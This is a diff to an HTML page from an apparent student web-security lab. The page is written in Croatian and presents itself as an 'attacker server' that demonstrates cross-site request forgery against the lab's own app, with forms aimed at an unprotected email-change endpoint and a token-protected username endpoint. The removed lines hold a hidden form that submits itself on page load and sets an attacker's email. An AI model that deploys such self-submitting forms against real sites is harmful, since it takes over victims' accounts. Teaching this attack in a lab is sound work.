@@ -1,11 +1,55 @@
 <html>
-    <body>
-        <form action="https://web2-lab2.onrender.com/changeemailvuln" method="POST">
-            <input type="hidden" name="email" id="email" value="eviluser@mail.com" />
-        </form>
-        </form>
-        <script>
-            document.forms[0].submit();
-        </script>
+    <body style="background-color: black;">
+        <div style="border-left: 5px chartreuse solid;border-right: 5px chartreuse solid;border-bottom: 5px chartreuse solid; margin-right: 1rem;">
+            <div style="border-left: 3px chartreuse dashed; margin-left: 1rem;">
+                <div style="border-left: 3px chartreuse dotted; margin-left: 1rem;border-right: 5px chartreuse solid;margin-right: 1rem;">
+                    <div style="border-left: 5px chartreuse solid;border-right: 5px chartreuse solid;border-bottom: 5px chartreuse dashed;margin-left: 1rem; margin-right: 1rem; margin-bottom: 1rem;">
+                        <div style="border-left: 3px chartreuse dashed; margin-left: 1rem;">
+                            <div style="border-left: 3px chartreuse dashed;border-right: 5px chartreuse solid; margin-left: 1rem;margin-right: 1rem;">
+                                <div style="color:chartreuse; text-align: center;margin-top:2rem">
+                                    <h1>Dobrodošli na napadački server!</h1>
+                                    <h2>Ovdje možete odabrati novi email ili username te pokušati izvesti CSRF napad.</h2>
+                                    <h3>Da je ovdje riječ o pravom napadu, kod ovog napada bi izgledao ovako nekako:</h3>
+                                    <img src="/images/napad.png">
+                                    <h3>U ovom primjeru je zbog demonstracije funckionalnosti omogućeno ručno pokretanje napada</h3>
+                                    <h4>1. CSRF napad : promjena emaila trenutno ulogiranog korisnika - nezaštićeni endpoint</h4>
+                                    <form action="https://web2-lab2.onrender.com/changeemailvuln" method="POST">
+                                        <input type="text" name="email" id="email"/>
+                                        <button type="submit">Pokreni 1.napad</button>
+                                    </form>
+                                </div>
+    
+    
+                                <div style="color:chartreuse; text-align: center; margin-top:4rem">
+                                    <h4>2. CSRF napad : promjena usernamea trenutno ulogiranog korisnika -endpoint zaštičen CSRF tokenom</h4>
+                                    <form action="https://web2-lab2.onrender.com/changeUserName" method="POST">
+                                        <input type="text" name="username" id="username" value="" />
+                                        <button type="submit">Pokreni 2.napad</button>
+                                    </form>
+                                </div>
+                            </div>    
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div> 
+        <div style="border-bottom:chartreuse 3px solid; margin-top: 0.3rem;"></div>  
+        <div style="border-bottom:chartreuse 3px solid; margin-top: 0.3rem;"></div>  
+        <div style="border-bottom:chartreuse 3px dotted; margin-top: 0.3rem; width: 80%;"></div>  
+        <div style="border-bottom:chartreuse 3px dotted; margin-top: 0.3rem; width: 80%;"></div>  
+        <div style="border-bottom:chartreuse 3px dashed; margin-top: 0.3rem;width: 80%; margin-left: auto;"></div>  
+        <div style="border-bottom:chartreuse 3px solid; margin-top: 0.3rem;"></div>  
+        <div style="border-bottom:chartreuse 3px solid; margin-top: 0.3rem;"></div>  
+        <div style="border-bottom:chartreuse 3px solid; margin-top: 0.3rem;"></div>  
+        <div style="border-bottom:chartreuse 3px dotted; margin-top: 0.3rem; width: 80%;"></div>  
+        <div style="border-bottom:chartreuse 3px solid; margin-top: 0.3rem;"></div>  
+        <div style="border-bottom:chartreuse 3px dashed; margin-top: 0.3rem;width: 80%; margin-left: auto;"></div>  
+        <div style="border-bottom:chartreuse 3px solid; margin-top: 0.3rem;"></div>  
+        <div style="border-bottom:chartreuse 3px dotted; margin-top: 0.3rem; width: 80%;"></div>  
+        <div style="border-bottom:chartreuse 3px solid; margin-top: 0.3rem;"></div>  
+        <div style="border-bottom:chartreuse 3px dotted; margin-top: 0.3rem; width: 80%;"></div>  
+        <div style="border-bottom:chartreuse 3px solid; margin-top: 0.3rem;"></div>  
+        <div style="border-bottom:chartreuse 3px dashed; margin-top: 0.3rem;width: 80%; margin-left: auto;"></div>  
+        <div style="border-bottom:chartreuse 3px solid; margin-top: 0.3rem;"></div>  
     </body>
 </html>
